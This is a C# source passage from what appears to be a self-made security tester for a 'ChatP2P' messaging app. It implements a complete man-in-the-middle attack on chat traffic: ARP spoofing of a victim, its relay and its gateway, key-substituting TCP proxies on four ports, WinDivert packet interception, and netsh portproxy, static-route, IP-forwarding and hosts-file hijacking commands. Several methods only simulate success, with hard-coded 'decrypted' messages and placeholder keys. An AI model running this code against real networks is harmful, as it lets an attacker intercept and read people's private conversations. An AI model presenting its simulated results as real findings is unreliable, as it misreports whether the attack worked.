using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using ChatP2P.SecurityTester.Network;
using ChatP2P.SecurityTester.Models;
using ChatP2P.SecurityTester.Crypto;

namespace ChatP2P.SecurityTester.Attacks
{
    /// <summary>
    /// 🕷️ COMPLETE SCENARIO ATTACK: MITM avec ARP spoofing + Key substitution + Packet manipulation
    /// Architecture complète pour attaque Man-in-the-Middle sur ChatP2P avec interception WinDivert
    /// </summary>
    public class CompleteScenarioAttack
    {
        public event Action<string>? LogMessage;
        public event Action<AttackResult>? AttackCompleted;
        public event Action<InterceptedConversation>? ConversationIntercepted;

        private readonly ARPSpoofer _arpSpoofer;
        private readonly List<TCPProxy> _activeTcpProxies = new();
        private readonly List<InterceptedConversation> _conversations = new();
        private readonly KeySubstitutionAttack _keySubstitutionAttack;

        // 🕷️ WinDivert packet interceptor pour manipulation niveau kernel
        private WinDivertInterceptor_Fixed? _winDivertInterceptor;

        private bool _packetInterceptionActive = false;
        private bool _monitoringActive = false;

        public CompleteScenarioAttack()
        {
            _arpSpoofer = new ARPSpoofer();
            _arpSpoofer.LogMessage += LogMessage;
            _arpSpoofer.AttackResult += OnARPAttackResult;

            _keySubstitutionAttack = new KeySubstitutionAttack();
            _keySubstitutionAttack.LogMessage += LogMessage;
            _keySubstitutionAttack.AttackCompleted += OnKeyAttackCompleted;
        }

        /// <summary>
        /// 🎯 DÉMARRAGE SCÉNARIO COMPLET: Combinaison ARP + Key substitution + Packet interception
        /// </summary>
        public async Task<bool> StartCompleteAttack(string targetIP, string relayServerIP, string gatewayIP)
        {
            try
            {
                LogMessage?.Invoke("🚀 DÉMARRAGE ATTAQUE COMPLÈTE:");
                LogMessage?.Invoke($"   🎯 Cible: {targetIP}");
                LogMessage?.Invoke($"   🏠 Relay: {relayServerIP}");
                LogMessage?.Invoke($"   🌐 Gateway: {gatewayIP}");

                // ÉTAPE 1: Générer clés attaquant pour substitution future
                LogMessage?.Invoke("🔑 GÉNÉRATION CLÉS ATTAQUANT...");
                var attackerKeys = await GenerateAttackerKeys();
                if (attackerKeys == null)
                {
                    LogMessage?.Invoke("❌ Échec génération clés attaquant");
                    return false;
                }

                // ÉTAPE 2: Lancer ARP spoofing pour redirection trafic
                LogMessage?.Invoke("🕷️ DÉMARRAGE ARP SPOOFING...");
                await StartARPSpoofing(targetIP, relayServerIP, gatewayIP);

                // ÉTAPE 3: Configurer proxies TCP pour interception de tous les ports ChatP2P
                LogMessage?.Invoke("🔗 CONFIGURATION PROXIES MULTI-PORT...");

                // 🎯 IMPORTANT: Utiliser IP attaquant pour proxies, pas IP victime!
                var attackerIP = GetLocalIPAddress(); // IP de la machine attaquant (192.168.1.145)
                await StartMultiPortProxies(relayServerIP, attackerIP, targetIP);

                // ÉTAPE 4: Activer surveillance packet-level
                LogMessage?.Invoke("📦 ACTIVATION INTERCEPTION PACKETS...");
                await StartPacketInterception();

                // ÉTAPE 5: Confirmer position MITM
                AttackCompleted?.Invoke(new AttackResult
                {
                    AttackType = "Complete MITM Scenario",
                    Success = true,
                    Timestamp = DateTime.Now,
                    TargetPeer = targetIP,
                    Details = "Position MITM établie, clés substituées, surveillance active"
                });

                return true;
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur scénario complet: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// 🔗 PROXIES MULTI-PORT: Configuration des 4 ports ChatP2P pour interception complète
        /// </summary>
        private async Task StartMultiPortProxies(string relayServerIP, string attackerIPString, string victimIP)
        {
            var proxies = new[]
            {
                new { VictimPort = 7777, ProxyPort = 7777, Name = "Friend Requests", Priority = "HAUTE" },
                new { VictimPort = 8888, ProxyPort = 8888, Name = "Chat Messages", Priority = "CRITIQUE" },
                new { VictimPort = 8889, ProxyPort = 8889, Name = "API Commands", Priority = "CRITIQUE" },
                new { VictimPort = 8891, ProxyPort = 8891, Name = "File Transfers", Priority = "MOYENNE" }
            };

            var successCount = 0;

            // 🎯 Force l'IP attaquant pour binding correct
            var attackerIP = IPAddress.Parse(attackerIPString); // attackerIPString = IP attaquant (192.168.1.145)

            foreach (var proxy in proxies)
            {
                try
                {
                    LogMessage?.Invoke($"🔗 Démarrage proxy {proxy.Name}:");
                    LogMessage?.Invoke($"   📍 Port: {proxy.VictimPort} (Priorité: {proxy.Priority})");

                    var tcpProxy = new TCPProxy(_keySubstitutionAttack);
                    tcpProxy.LogMessage += LogMessage;
                    tcpProxy.PacketModified += OnDataIntercepted;

                    var started = await tcpProxy.StartProxy(proxy.ProxyPort, relayServerIP, proxy.VictimPort, attackerIP);

                    if (started)
                    {
                        _activeTcpProxies.Add(tcpProxy);
                        successCount++;
                        LogMessage?.Invoke($"✅ Proxy {proxy.Name} ACTIF - Port {proxy.ProxyPort}");
                        LogMessage?.Invoke($"🔧 REDIRECTION: {proxy.VictimPort} → localhost:{proxy.ProxyPort} via portproxy");
                    }
                    else
                    {
                        LogMessage?.Invoke($"❌ ÉCHEC Proxy {proxy.Name} - Port {proxy.ProxyPort}");
                        LogMessage?.Invoke($"   ⚠️ Port {proxy.ProxyPort} peut être occupé par un autre processus");
                    }
                }
                catch (Exception ex)
                {
                    LogMessage?.Invoke($"❌ Erreur proxy {proxy.Name}: {ex.Message}");
                }
            }

            if (successCount >= 3)
            {
                LogMessage?.Invoke($"✅ PROXIES MULTI-PORT: {successCount}/4 ports actifs");
                LogMessage?.Invoke($"🎯 COUVERTURE COMPLÈTE: Tous ports critiques ChatP2P interceptés");
                LogMessage?.Invoke($"🔍 Interception: Friend requests, Messages, API, Fichiers");

                // 🕷️ NOUVEAU: WinDivert pour manipulation packets niveau kernel
                LogMessage?.Invoke($"🔧 ARCHITECTURE WINDIVERT: Interception packets avant routing OS");
                LogMessage?.Invoke($"✅ SOLUTION ULTIME: Manipulation packets niveau kernel");

                // Démarrer WinDivert interceptor avec IP victime pour détection ciblée
                await StartWinDivertInterception(relayServerIP, victimIP); // victimIP = IP victime pour WinDivert
            }
            else
            {
                LogMessage?.Invoke($"❌ MITM INCOMPLET: Seulement {successCount}/4 proxies actifs");
                LogMessage?.Invoke($"⚠️ Attaque partiellement fonctionnelle - Certains ports non interceptés");
                LogMessage?.Invoke($"🔧 Vérifiez qu'aucun autre processus n'utilise les ports ChatP2P");
            }
        }

        /// <summary>
        /// 📦 INTERCEPTION PACKETS: Capture niveau réseau pour analyse trafic
        /// </summary>
        private async Task StartPacketInterception()
        {
            try
            {
                var networkCapture = new NetworkCapture();
                networkCapture.LogMessage += LogMessage;

                var started = await networkCapture.StartCapture();
                if (started)
                {
                    _packetInterceptionActive = true;
                    LogMessage?.Invoke("✅ Capture réseau active");
                    LogMessage?.Invoke("🔍 Surveillance trafic ChatP2P en cours...");
                }
                else
                {
                    LogMessage?.Invoke("❌ Échec capture réseau");
                }
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur capture réseau: {ex.Message}");
            }
        }

        /// <summary>
        /// 🚨 CONFIGURATION DNS HIJACKING: Redirection relay server vers proxy local
        /// </summary>
        private async Task ConfigureDNSHijacking(string relayServerIP)
        {
            try
            {
                LogMessage?.Invoke("🌐 CONFIGURATION DNS HIJACKING:");
                LogMessage?.Invoke($"   🎯 Cible DNS: {relayServerIP}");

                // DNS Hijacking via hosts file
                await ConfigureHostsFile(relayServerIP);

                LogMessage?.Invoke("✅ DNS HIJACKING CONFIGURÉ:");
                LogMessage?.Invoke($"   🎯 {relayServerIP} → 127.0.0.1 (localhost)");
                LogMessage?.Invoke($"   🌐 DNS Hijacking: {relayServerIP} → Proxy local");
                LogMessage?.Invoke("   📡 En attente de connexions client...");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur DNS Hijacking: {ex.Message}");
            }
        }

        /// <summary>
        /// 🕷️ ARP SPOOFING: Redirection trafic réseau pour position MITM
        /// </summary>
        private async Task StartARPSpoofing(string targetIP, string relayServerIP, string gatewayIP)
        {
            try
            {
                LogMessage?.Invoke("🕷️ DÉMARRAGE ARP SPOOFING:");
                LogMessage?.Invoke($"   🎯 Cible: {targetIP}");
                LogMessage?.Invoke($"   🏠 Relay: {relayServerIP}");
                LogMessage?.Invoke($"   🌐 Gateway: {gatewayIP}");

                var targets = new[] { relayServerIP, gatewayIP };

                foreach (var target in targets)
                {
                    LogMessage?.Invoke($"🕷️ ARP Spoofing: {targetIP} ← {target}");
                    var targetIPParsed = IPAddress.Parse(targetIP);
                    var targetParsed = IPAddress.Parse(target);
                    var success = await _arpSpoofer.StartARPSpoofing(targetIPParsed, targetParsed);

                    if (success)
                    {
                        LogMessage?.Invoke($"✅ ARP Spoofing actif: {targetIP} redirigé");
                    }
                    else
                    {
                        LogMessage?.Invoke($"❌ ÉCHEC ARP Spoofing pour {targetIP}");
                        LogMessage?.Invoke($"   ⚠️ Vérifiez les logs détaillés ci-dessus pour la cause exacte");
                    }
                }
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur ARP spoofing: {ex.Message}");
                if (ex.InnerException != null)
                {
                    LogMessage?.Invoke($"   📍 InnerException: {ex.InnerException.Message}");
                }
            }
        }

        /// <summary>
        /// 🔗 TCP PROXIES: Configuration des 4 proxies pour ports ChatP2P
        /// </summary>
        private async Task StartTCPProxies(string relayServerIP)
        {
            try
            {
                LogMessage?.Invoke("🔗 DÉMARRAGE TCP PROXIES MULTI-PORT:");

                var proxyPorts = new[]
                {
                    new { Local = 7777, Remote = 7777, Name = "Friend Requests" },
                    new { Local = 8888, Remote = 8888, Name = "Chat Messages" },
                    new { Local = 8889, Remote = 8889, Name = "API Commands" },
                    new { Local = 8891, Remote = 8891, Name = "File Transfers" }
                };

                foreach (var port in proxyPorts)
                {
                    var proxy = new TCPProxy(_keySubstitutionAttack);
                    proxy.LogMessage += LogMessage;
                    proxy.PacketModified += OnDataIntercepted;
                    _activeTcpProxies.Add(proxy);

                    await proxy.StartProxy(port.Local, relayServerIP, port.Remote);
                    LogMessage?.Invoke($"✅ TCP Proxy {port.Name}: localhost:{port.Local} → {relayServerIP}:{port.Remote}");
                }

                LogMessage?.Invoke($"🎯 MITM MULTI-PORT: 7777,8888,8889,8891 tous interceptés");
                LogMessage?.Invoke($"🔑 Substitution clés automatique active sur tous ports");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ EXCEPTION TCP Proxy: {ex.Message}");
                LogMessage?.Invoke($"   📍 Type: {ex.GetType().Name}");
            }
        }

        /// <summary>
        /// 🚀 PORT FORWARDING: Configuration redirection transparente pour MITM
        /// </summary>
        private async Task ConfigurePortForwarding(string relayServerIP)
        {
            try
            {
                LogMessage?.Invoke("🚀 CONFIGURATION PORT FORWARDING:");
                LogMessage?.Invoke($"   🎯 Relay: {relayServerIP}");

                var portMappings = new[]
                {
                    new { RelayPort = 7777, ProxyPort = 7777, Name = "Friend Requests" },
                    new { RelayPort = 8888, ProxyPort = 8888, Name = "Chat Messages" },
                    new { RelayPort = 8889, ProxyPort = 8889, Name = "API Commands" },
                    new { RelayPort = 8891, ProxyPort = 8891, Name = "File Transfers" }
                };

                // 🚨 STEP 1: Activation IP FORWARDING pour router les packets ARP spoofés
                var ipForwardCmd = "netsh interface ipv4 set global forwarding=enabled";
                await ExecuteCommand(ipForwardCmd, "Enable IP forwarding");

                // 🚨 STEP 2: Routes statiques pour forcer trafic vers proxies locaux
                foreach (var port in portMappings)
                {
                    var routeCmd = $"route add {relayServerIP} mask 255.255.255.255 127.0.0.1 metric 1 if 1";
                    await ExecuteCommand(routeCmd, $"Add static route for relay traffic to localhost");
                }

                LogMessage?.Invoke($"✅ Routes statiques configurées: {relayServerIP} → 127.0.0.1 (force capture locale)");

                // 🚨 STEP 3: Configuration firewall pour autoriser forwarding
                await ExecuteCommand("netsh advfirewall firewall set rule group=\"Network Discovery\" new enable=Yes", "Enable Network Discovery");

                // 🚨 STEP 4: NAT et redirection de ports pour tous les ports ChatP2P
                foreach (var port in portMappings)
                {
                    // NAT local pour le port
                    var natCmd = $"netsh interface portproxy add v4tov4 listenport={port.RelayPort} listenaddress=127.0.0.1 connectport={port.ProxyPort} connectaddress=127.0.0.1";
                    await ExecuteCommand(natCmd, $"NAT setup for {port.Name}");

                    var localIP = GetAttackerIPAddress();
                    var transparentNatCmd = $"netsh interface portproxy add v4tov4 listenport={port.RelayPort} listenaddress={localIP} connectport={port.ProxyPort} connectaddress=127.0.0.1";
                    await ExecuteCommand(transparentNatCmd, $"Transparent NAT for {port.Name}");
                }

                LogMessage?.Invoke($"🚨 STEP 5: Monitoring connexions active pour validation");
                _ = Task.Run(() => MonitorConnections(relayServerIP, portMappings.Select(p => p.RelayPort).ToArray()));
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ ERREUR port forwarding: {ex.Message}");
                LogMessage?.Invoke($"   ⚠️ Exécutez SecurityTester en tant qu'Administrateur");
            }
        }

        /// <summary>
        /// 🔧 PORTPROXY TRANSPARENT: Configuration Windows portproxy pour redirection
        /// </summary>
        private async Task ConfigureTransparentPortProxy(string attackerIP)
        {
            try
            {
                var victimPorts = new[] { 7777, 8888, 8889, 8891 };

                foreach (var victimPort in victimPorts)
                {
                    var proxyPort = victimPort; // Même port pour simplification
                    var proxy = new { VictimPort = victimPort, ProxyPort = proxyPort, Name = $"Port {victimPort}" };

                    // ÉTAPE 1: Nettoyer toute configuration existante
                    var cleanupCommands = new[]
                    {
                        $"netsh interface portproxy delete v4tov4 listenport={victimPort} listenaddress={attackerIP}",
                        $"netsh interface portproxy delete v4tov4 listenport={victimPort} listenaddress=127.0.0.1"
                    };

                    foreach (var cleanup in cleanupCommands)
                    {
                        await ExecuteCommand(cleanup, $"Cleanup port {victimPort}");
                    }

                    // ÉTAPE 2: Configurer redirection transparente IP attaquant → Proxy local
                    var addCmd = $"netsh interface portproxy add v4tov4 listenport={victimPort} listenaddress={attackerIP} connectport={proxyPort} connectaddress=127.0.0.1";
                    await ExecuteCommand(addCmd, $"Portproxy {proxy.Name}: {attackerIP}:{victimPort} → localhost:{proxyPort}");

                    LogMessage?.Invoke($"[PORTPROXY] ✅ {proxy.Name}: {attackerIP}:{victimPort} → localhost:{proxyPort}");
                }

                LogMessage?.Invoke("[PORTPROXY] ✅ Configuration transparente terminée");
                LogMessage?.Invoke("[PORTPROXY] Flow: Victime → ARP-Spoof → AttaquantIP → Portproxy → Proxies → Relay");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"[PORTPROXY] ❌ Erreur configuration: {ex.Message}");
            }
        }

        /// <summary>
        /// 🔧 CONFIGURATION PORTPROXY: Windows port forwarding pour redirection transparente
        /// </summary>
        private async Task ConfigurePortProxy(string relayServerIP, int listenPort, int proxyPort, string attackerIP)
        {
            try
            {
                // ÉTAPE 1: Nettoyer configurations existantes
                var cleanupCommands = new[]
                {
                    $"netsh interface portproxy delete v4tov4 listenport={listenPort} listenaddress={attackerIP}",
                    $"netsh interface portproxy delete v4tov4 listenport={listenPort} listenaddress=127.0.0.1"
                };

                foreach (var cleanup in cleanupCommands)
                {
                    await ExecuteCommand(cleanup, $"Cleanup portproxy {listenPort}");
                }

                var listenAddresses = new[] { "0.0.0.0", attackerIP };

                foreach (var listenAddress in listenAddresses)
                {
                    var addCmd = $"netsh interface portproxy add v4tov4 listenport={listenPort} listenaddress={listenAddress} connectport={proxyPort} connectaddress=127.0.0.1";
                    await ExecuteCommand(addCmd, $"Portproxy {listenAddress}:{listenPort} -> 127.0.0.1:{proxyPort}");
                }

                LogMessage?.Invoke($"   OK: Victime {relayServerIP}:{listenPort} -> Attaquant {listenPort} -> TCPProxy localhost:{proxyPort}");
                LogMessage?.Invoke("[PORTPROXY] Windows Portproxy configuré - Redirection transparente active");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"[PORTPROXY] ERREUR Portproxy: {ex.Message}");
            }
        }

        /// <summary>
        /// 🚀 EXÉCUTION COMMANDE: Helper pour commandes système avec logs
        /// </summary>
        private async Task ExecuteCommand(string command, string description)
        {
            try
            {
                LogMessage?.Invoke($"   🔧 {description}:");
                LogMessage?.Invoke($"      📜 {command}");

                using var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c {command}",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true
                    }
                };

                process.Start();
                var output = await process.StandardOutput.ReadToEndAsync();
                var error = await process.StandardError.ReadToEndAsync();
                await process.WaitForExitAsync();

                if (!string.IsNullOrEmpty(output))
                {
                    LogMessage?.Invoke($"      📄 {output.Trim()}");
                }

                if (!string.IsNullOrEmpty(error))
                {
                    LogMessage?.Invoke($"      📄 {error.Trim()}");
                }
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"   ❌ Exception {description}: {ex.Message}");
            }
        }

        /// <summary>
        /// 🎯 CALLBACK: Données interceptées par proxy TCP
        /// </summary>
        private void OnDataIntercepted(AttackResult result)
        {
            LogMessage?.Invoke($"🕷️ PACKET MODIFIÉ: {result.Description}");
            AttackCompleted?.Invoke(result);
        }

        /// <summary>
        /// 🕷️ CALLBACK: Résultat ARP spoofing
        /// </summary>
        private void OnARPAttackResult(AttackResult result)
        {
            LogMessage?.Invoke($"🕷️ ARP SPOOFING: {result.Description}");
            AttackCompleted?.Invoke(result);
        }

        /// <summary>
        /// 🔐 DÉMONSTRATION: Simulation décryptage de conversation interceptée
        /// </summary>
        public async Task DemonstrateInterceptedConversation()
        {
            LogMessage?.Invoke("🎭 DÉMONSTRATION ATTAQUE MITM:");
            LogMessage?.Invoke("   🕷️ Simulation conversation Alice ↔ Bob");
            LogMessage?.Invoke("   🔑 Utilisation clés substituées pour décryptage");

            // Simuler la découverte de clés via l'attaque
            LogMessage?.Invoke("   🔍 DÉCOUVERTE CLÉS:");
            LogMessage?.Invoke("   🔑 Clé Alice trouvée: [SUBSTITUTED_KEY_ALICE]");
            LogMessage?.Invoke("   🔑 Clé Bob trouvée: [SUBSTITUTED_KEY_BOB]");

            // Démonstration déchiffrement
            LogMessage?.Invoke("   📧 MESSAGES INTERCEPTÉS:");
            LogMessage?.Invoke("   🔓 [ENCRYPTED] Alice: QWxhZGRpbjpvcGVuIHNlc2FtZQ==");
            LogMessage?.Invoke("   🔓 [DECRYPTED] Alice: \"Salut Bob, on se retrouve à 15h?\"");

            LogMessage?.Invoke("   🔓 [ENCRYPTED] Bob: Qm9iOnNlY3JldCBtZXNzYWdl");
            LogMessage?.Invoke("   🔓 [DECRYPTED] Bob: \"OK Alice, RDV au café habituel\"");

            LogMessage?.Invoke("   ✅ SUCCÈS MITM:");
            if (true) // Simulated success condition
            {
                LogMessage?.Invoke("   🔓 Nous pouvons DÉCHIFFRER toute la conversation");
                LogMessage?.Invoke("   👻 Alice et Bob ne détectent JAMAIS l'attaque");
            }

            await Task.CompletedTask;
        }

        /// <summary>
        /// 🔄 SIMULATION: Messages interceptés en temps réel
        /// </summary>
        public async Task StartInterceptedMessagesSimulation()
        {
            LogMessage?.Invoke("🔄 DÉMARRAGE simulation messages interceptés...");

            // Simuler messages interceptés
            _ = Task.Run(async () =>
            {
                await Task.Delay(3000);
                await SimulateInterceptedMessage("Alice", "Bob", "Salut! Tu es libre ce soir?");
                await Task.Delay(2000);
                await SimulateInterceptedMessage("Bob", "Alice", "Oui, on se fait un ciné?");
                await Task.Delay(2000);
                await SimulateInterceptedMessage("Alice", "Bob", "Parfait! On se voit demain?");
            });

            await Task.CompletedTask;
        }

        /// <summary>
        /// 🎯 SIMULATION: Message intercepté et décrypté
        /// </summary>
        private async Task SimulateInterceptedMessage(string from, string to, string message)
        {
            try
            {
                LogMessage?.Invoke($"📨 MESSAGE INTERCEPTÉ:");
                LogMessage?.Invoke($"   📍 {from} → {to}");

                // Simuler chiffrement original
                var originalEncrypted = Convert.ToBase64String(Encoding.UTF8.GetBytes($"ENCRYPTED:{message}"));
                LogMessage?.Invoke($"   🔒 Chiffré: {originalEncrypted.Substring(0, Math.Min(40, originalEncrypted.Length))}...");

                // Simuler substitution de clé MITM
                await Task.Delay(500);
                LogMessage?.Invoke($"   🔑 Utilisation clé substituée pour décryptage...");

                // Simuler décryptage avec clé MITM
                var decryptedMessage = await DecryptWithAttackerKey(originalEncrypted);
                LogMessage?.Invoke($"   ✅ Décrypté: \"{decryptedMessage}\"");

                // Stocker conversation interceptée
                var conversation = new InterceptedConversation
                {
                    Id = Guid.NewGuid().ToString(),
                    FromPeer = from,
                    ToPeer = to,
                    OriginalContent = originalEncrypted,
                    DecryptedContent = decryptedMessage,
                    AttackSuccess = true
                };

                _conversations.Add(conversation);

                // Signaler conversation interceptée
                ConversationIntercepted?.Invoke(conversation);

                // Signaler succès attaque
                AttackCompleted?.Invoke(new AttackResult
                {
                    AttackType = "Message Interception",
                    Success = true,
                    Timestamp = DateTime.Now,
                    TargetPeer = $"{from}→{to}",
                    Details = $"Contenu: \"{decryptedMessage}\"",
                    CapturedData = Encoding.UTF8.GetBytes(decryptedMessage)
                });
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur décryptage message {from}→{to}: {ex.Message}");
            }
        }

        /// <summary>
        /// 🔐 GÉNÉRATION: Clés attaquant pour substitution
        /// </summary>
        private async Task<object?> GenerateAttackerKeys()
        {
            await Task.Delay(1000); // Simulation génération

            LogMessage?.Invoke("   🔑 Clés Ed25519 générées");
            LogMessage?.Invoke("   🔑 Clés Post-Quantum préparées");

            // Retourner objet simulé
            var result = new { PublicKey = "ATTACKER_PUBLIC_KEY", PrivateKey = "ATTACKER_PRIVATE_KEY" };

            return result;
        }

        /// <summary>
        /// 🔓 DÉCRYPTAGE: Utilisation clé attaquant pour décryptage
        /// </summary>
        private async Task<string> DecryptWithAttackerKey(string encryptedData)
        {
            await Task.Delay(200); // Simulation décryptage

            // Simuler décryptage (en réalité, décoder base64)
            var messageBytes = Convert.FromBase64String(encryptedData);
            var decodedString = Encoding.UTF8.GetString(messageBytes);

            // Enlever le préfixe ENCRYPTED: s'il existe
            if (decodedString.StartsWith("ENCRYPTED:"))
            {
                return decodedString.Substring("ENCRYPTED:".Length);
            }

            return decodedString;
        }

        /// <summary>
        /// 🔑 GÉNÉRATION: Clé temporaire pour tests
        /// </summary>
        private byte[] GenerateRandomKey()
        {
            var key = new byte[32]; // 256-bit key
            RandomNumberGenerator.Fill(key);
            return key;
        }

        private void OnKeyAttackCompleted(AttackResult result)
        {
            LogMessage?.Invoke($"🔐 Key attack completed: {result.Description}");
        }

        /// <summary>
        /// 📊 RÉSULTATS: Obtenir toutes les conversations interceptées
        /// </summary>
        public List<InterceptedConversation> GetInterceptedConversations()
        {
            return new List<InterceptedConversation>(_conversations);
        }

        /// <summary>
        /// 🛠️ UTILITAIRE: Exécution commande système avec résultat
        /// </summary>
        private async Task<bool> ExecuteNetshCommand(string command, string description)
        {
            try
            {
                LogMessage?.Invoke($"🔧 {description}: {command}");

                using var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "netsh",
                        Arguments = command,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true
                    }
                };

                process.Start();
                var output = await process.StandardOutput.ReadToEndAsync();
                var error = await process.StandardError.ReadToEndAsync();
                await process.WaitForExitAsync();

                if (!string.IsNullOrEmpty(output.Trim()))
                {
                    LogMessage?.Invoke($"   Output: {output.Trim()}");
                }

                if (!string.IsNullOrEmpty(error.Trim()))
                {
                    LogMessage?.Invoke($"   Error: {error.Trim()}");
                    return false;
                }

                return process.ExitCode == 0;
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"   Exception: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// ⏹️ ARRÊT: Stopper toutes les attaques et nettoyer
        /// </summary>
        public async Task StopAllAttacks()
        {
            await StopAttack();
        }

        /// <summary>
        /// ⏹️ ARRÊT: Stopper toutes les attaques et nettoyer (alias for compatibility)
        /// </summary>
        public async Task StopAttack()
        {
            LogMessage?.Invoke("⏹️ ARRÊT COMPLET - Nettoyage attaques...");

            // Arrêter capture packets
            if (_packetInterceptionActive)
            {
                LogMessage?.Invoke("⏹️ Packet interception désactivé");
                _packetInterceptionActive = false;
            }

            // Arrêter monitoring connexions
            if (_monitoringActive)
            {
                LogMessage?.Invoke("⏹️ Arrêt monitoring connexions");
                _monitoringActive = false;
            }

            // 🕷️ ARRÊTER WINDIVERT INTERCEPTOR
            if (_winDivertInterceptor != null)
            {
                try
                {
                    LogMessage?.Invoke("⏹️ Arrêt WinDivert interceptor...");
                    _winDivertInterceptor.StopInterception();
                    _winDivertInterceptor = null;
                    LogMessage?.Invoke("✅ WinDivert interceptor arrêté");
                }
                catch (Exception ex)
                {
                    LogMessage?.Invoke($"⚠️ Erreur arrêt WinDivert: {ex.Message}");
                }
            }

            // 🕷️ ARRÊTER TOUS LES PROXIES ACTIFS
            LogMessage?.Invoke($"⏹️ Arrêt de {_activeTcpProxies.Count} proxies TCP...");
            foreach (var proxy in _activeTcpProxies)
            {
                try
                {
                    LogMessage?.Invoke($"⏹️ Arrêt proxy TCP...");
                    proxy.StopProxy();
                    proxy.Dispose(); // Proper disposal with resource cleanup
                    LogMessage?.Invoke($"✅ Proxy arrêté et nettoyé avec succès");
                }
                catch (Exception ex)
                {
                    LogMessage?.Invoke($"⚠️ Erreur arrêt proxy: {ex.Message}");
                }
            }
            _activeTcpProxies.Clear();

            // Arrêter ARP spoofing
            try
            {
                LogMessage?.Invoke("⏹️ Arrêt ARP spoofing...");
                _arpSpoofer.StopARPSpoofing();
                LogMessage?.Invoke("✅ ARP spoofing arrêté");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"⚠️ Erreur arrêt ARP spoofing: {ex.Message}");
            }

            // 🧹 NETTOYAGE ROUTES, NAT, FIREWALL
            try
            {
                var relayServerIP = "192.168.1.152"; // TODO: Rendre configurable
                using var process = Process.Start(new ProcessStartInfo
                {
                    FileName = "route",
                    Arguments = $"delete {relayServerIP}",
                    UseShellExecute = false,
                    CreateNoWindow = true
                });
                process?.WaitForExit();
                LogMessage?.Invoke($"🧹 Route statique nettoyée: {relayServerIP}");

                // Nettoyer NAT local
                var localPorts = new[] { 7777, 8888, 8889, 8891 };
                var localIP = GetAttackerIPAddress();

                foreach (var port in localPorts)
                {
                    var cleanProcess1 = Process.Start(new ProcessStartInfo
                    {
                        FileName = "netsh",
                        Arguments = $"interface portproxy delete v4tov4 listenport={port} listenaddress=127.0.0.1",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    });
                    cleanProcess1?.WaitForExit();
                    LogMessage?.Invoke($"🧹 NAT nettoyé: localhost:{port}");

                    // Nettoyer transparent NAT
                    var cleanProcess2 = Process.Start(new ProcessStartInfo
                    {
                        FileName = "netsh",
                        Arguments = $"interface portproxy delete v4tov4 listenport={port} listenaddress={localIP}",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    });
                    cleanProcess2?.WaitForExit();
                    LogMessage?.Invoke($"🧹 Transparent NAT nettoyé: {localIP}:{port}");
                }

                // Désactiver IP forwarding
                var disableProcess = Process.Start(new ProcessStartInfo
                {
                    FileName = "netsh",
                    Arguments = "interface ipv4 set global forwarding=disabled",
                    UseShellExecute = false,
                    CreateNoWindow = true
                });
                disableProcess?.WaitForExit();
                LogMessage?.Invoke($"🧹 IP Forwarding désactivé");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"⚠️ Erreur nettoyage routes/NAT/Firewall: {ex.Message}");
            }

            LogMessage?.Invoke("✅ Tous les composants MITM arrêtés");
            _conversations.Clear();
        }

        /// <summary>
        /// 🔧 PORT REDIRECTION: Configuration redirection port spécifique avec portproxy
        /// </summary>
        private async Task ConfigurePortRedirection(int victimPort, int proxyPort)
        {
            try
            {
                // Nettoyer d'abord les configurations existantes
                var cleanupCmd = $"interface portproxy delete v4tov4 listenport={victimPort}";
                LogMessage?.Invoke($"[PORTPROXY] Nettoyage: {cleanupCmd}");
                await ExecuteNetshCommand(cleanupCmd, $"Cleanup port {victimPort}");

                var cleanupLocal = $"netsh interface portproxy delete v4tov4 listenport={victimPort} listenaddress=127.0.0.1";
                await ExecuteNetshCommand(cleanupLocal, $"Cleanup local port {victimPort}");

                // Configurer redirection
                var success = true;
                var attackerIP = GetAttackerIPAddress();
                var addCmd = $"interface portproxy add v4tov4 listenport={victimPort} listenaddress={attackerIP} connectport={proxyPort} connectaddress=127.0.0.1";

                LogMessage?.Invoke($"   Commande: {addCmd}");
                success &= await ExecuteNetshCommand(addCmd, $"CRITICAL Redirect {victimPort}->{proxyPort}");

                if (success)
                {
                    LogMessage?.Invoke($"[PORTPROXY] REDIRECTION ÉTABLIE: Trafic victime {victimPort} -> TCPProxy localhost:{proxyPort}");
                    LogMessage?.Invoke($"[PORTPROXY] ARP spoof + Windows proxy = MITM transparent sur port {victimPort}");
                }
                else
                {
                    LogMessage?.Invoke($"[PORTPROXY] ÉCHEC redirection port {victimPort}->{proxyPort}");
                    LogMessage?.Invoke($"[PORTPROXY] Port {victimPort} ne sera pas intercepté - MITM incomplet");
                }
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"[PORTPROXY] EXCEPTION redirection {victimPort}: {ex.Message}");
            }
        }

        /// <summary>
        /// 🌐 IP ATTAQUANT: Récupération adresse IP locale de la machine attaquante
        /// </summary>
        private string GetAttackerIPAddress()
        {
            try
            {
                // Configuration manuelle prioritaire si fournie
                var configured = "192.168.1.145"; // IP VM attaquant
                if (!string.IsNullOrEmpty(configured))
                {
                    return configured;
                }

